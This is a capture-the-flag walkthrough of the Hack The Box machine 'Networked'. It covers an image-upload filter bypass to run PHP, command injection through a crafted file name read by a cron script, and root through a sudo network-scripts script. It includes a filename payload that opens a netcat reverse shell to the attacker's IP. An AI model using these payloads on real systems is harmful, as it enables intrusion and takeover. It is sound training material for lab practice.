---
layout: default
---
# Networked

# Enumeration

IP → 10.10.10.146

Open ports.

```bash
PORT    STATE  SERVICE REASON
22/tcp  open   ssh     syn-ack
80/tcp  open   http    syn-ack
```

### Web server enumeration

```bash
┌──(kali㉿kali)-[~/machines/linux/networked]
└─$ curl -I 10.10.10.146 
HTTP/1.1 200 OK
Date: Fri, 22 Dec 2023 05:28:12 GMT
Server: Apache/2.4.6 (CentOS) PHP/5.4.16
X-Powered-By: PHP/5.4.16
Content-Type: text/html; charset=UTF-8

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/machines/linux/networked]
└─$ whatweb 10.10.10.146                   
http://10.10.10.146 [200 OK] Apache[2.4.6], Country[RESERVED][ZZ], HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.4.16], IP[10.10.10.146], PHP[5.4.16], X-Powered-By[PHP/5.4.16]
```

- PHP version is very old

The source code of the web server suggets that thera are more routes. And it is and `index.php` page.

```html
<html>
<body>
Hello mate, we're building the new FaceMash!</br>
Help by funding us and be the new Tyler&Cameron!</br>
Join us at the pool party this Sat to get a glimpse
<!-- upload and gallery not yet linked -->
</body>
</html>
```

### Fuzzing http://10.10.10.146/

- common.txt
    
    ```html
    /.hta                 (Status: 403) [Size: 206]
    /.htaccess            (Status: 403) [Size: 211]
    /.htpasswd            (Status: 403) [Size: 211]
    /backup               (Status: 301) [Size: 235] [--> http://10.10.10.146/backup/]
    /cgi-bin/             (Status: 403) [Size: 210]
    /index.php            (Status: 200) [Size: 229]
    /uploads              (Status: 301) [Size: 236] [--> http://10.10.10.146/uploads/]
    ```
    
- directory-list-2.3-medium.txt
    
    ```bash
    /index.php            (Status: 200) [Size: 229]
    /uploads              (Status: 301) [Size: 236] [--> http://10.10.10.146/uploads/]
    /photos.php           (Status: 200) [Size: 1302]
    /upload.php           (Status: 200) [Size: 169]
    /lib.php              (Status: 200) [Size: 0]
    /backup               (Status: 301) [Size: 235] [--> http://10.10.10.146/backup/]
    ```
    

# Inspecting the web backup

We found a web backup, but we don’t know it is up to date. The files in this backup are the same ones we have found using fuzzing.

```bash
┌──(kali㉿kali)-[~/machines/linux/networked]
└─$ tar -tf backup.tar
index.php
lib.php
photos.php
upload.php
```

The first we want to do is to bypass this:

```php
if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
      echo '<pre>Invalid image file.</pre>';
      displayform();
    }
```

- We need to bypass the file type filter
- We need a little image

To bypass this first filter we can upload a PHP but appending the magic bytes of a GIF image atthe beginning of the script.

![Untitled](Networked%2069bfd8bf7ef543cb8826afecf0d949aa/Untitled.png)

The function check_file_type will check the mimetype of the file we upload. Bascially this is the first bytes of the file. If we write `GIF8;` we will bypass this check.

Now we have to bypass the web server extension filter.

```php
list ($foo,$ext) = getnameUpload($myFile["name"]);
    $validext = array('.jpg', '.png', '.gif', '.jpeg');
    $valid = false;
    foreach ($validext as $vext) {
      if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
        $valid = true;
      }
    }
```

It will check if the extension of the uploaded file is the one of an image. To bypass this we can tamper the name of our file in the following manner.

![Untitled](Networked%2069bfd8bf7ef543cb8826afecf0d949aa/Untitled%201.png)

Now if we access this image directly in the uploads folder, we will see the phpinfo from the machine.

![Untitled](Networked%2069bfd8bf7ef543cb8826afecf0d949aa/Untitled%202.png)

Gaining a foothold now is trivial, we will upload a php reverse shell.

# Pivoting from apache user to guly

- Files belonging to him

```bash
bash-4.2$ find / -user "guly" 2>/dev/null -ls
12583041    4 drwxr-xr-x   2 guly     guly         4096 Sep  6  2022 /home/guly
13393855    4 -rw-r--r--   1 guly     guly           18 Oct 30  2018 /home/guly/.bash_logout
13393856    4 -rw-r--r--   1 guly     guly          193 Oct 30  2018 /home/guly/.bash_profile
13393857    4 -rw-r--r--   1 guly     guly          231 Oct 30  2018 /home/guly/.bashrc
13393866    4 -r--------   1 guly     guly           33 Dec 22 09:10 /home/guly/user.txt
  5740    4 -rw-rw----   1 guly     mail         2941 Jul  2  2019 /var/spool/mail/guly
```

- Crontab

```bash
bash-4.2$ cat crontab.guly 
*/3 * * * * php /home/guly/check_attack.php
bash-4.2$ cat check_attack.php 
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
```

We can try to inject a command execution in one of th exec statements. We can control the value of the variable `$value` , this variable is created in a for loop and is the name of the files in the `/var/www/html/uploads` directory. In each iteration it is set to one the files.

So to inejct a command here we can try the following.

- `echo '' > '/var/www/html/uploads/";$(nc -c bash 10.10.14.14 443);"’`

If we wait some minutes we will receive a shell as user guly.

# Privilege escalation

As user guly we have a sudo privilege.

```bash
[guly@networked ~]$ sudo -l
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```

The script is this one.

```bash
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
```

We can try to inject commands, but nothing of that will work because of the regex filter. If we search about **network-scripts w**e will find the following post [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f) which tells how you can execute commands as root using this directory.

Basically the following input will allowus to execute commands as root.

```bash
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
interface NAME:
Network /bin/id
interface PROXY_METHOD:
test
interface BROWSER_ONLY:
test^H^H^H
wrong input, try again
interface BROWSER_ONLY:
tes
interface BOOTPROTO:
test
uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
```

We execute `bash` insteod of the `id` command and we are root.

```bash
interface NAME:
net bash
interface PROXY_METHOD:

wrong input, try again
interface PROXY_METHOD:
s
interface BROWSER_ONLY:
s
interface BOOTPROTO:
s
[root@networked network-scripts]# whoami
root
```